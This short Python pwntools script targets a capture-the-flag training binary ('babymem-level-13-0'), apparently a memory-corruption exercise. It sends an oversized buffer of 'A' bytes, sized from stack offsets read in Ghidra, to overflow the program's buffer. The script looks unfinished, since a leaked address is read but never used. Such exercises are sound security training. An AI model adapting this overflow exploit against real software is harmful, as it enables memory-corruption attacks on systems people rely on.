from pwn import * 

# Here we have addresses, still format string error?

elf = ELF("/challenge/babymem-level-13-0")

io = elf.process()

io.recvuntil("0x")
add = io.recvuntil(".")
add = add[:-1]

# Ghidra
f_offset = int("118", 16)
b_offset = int("208", 16)

payload = b'A' * (b_offset - f_offset)

io.sendline(f"{len(payload)}")
io.sendline(payload)

io.interactive()
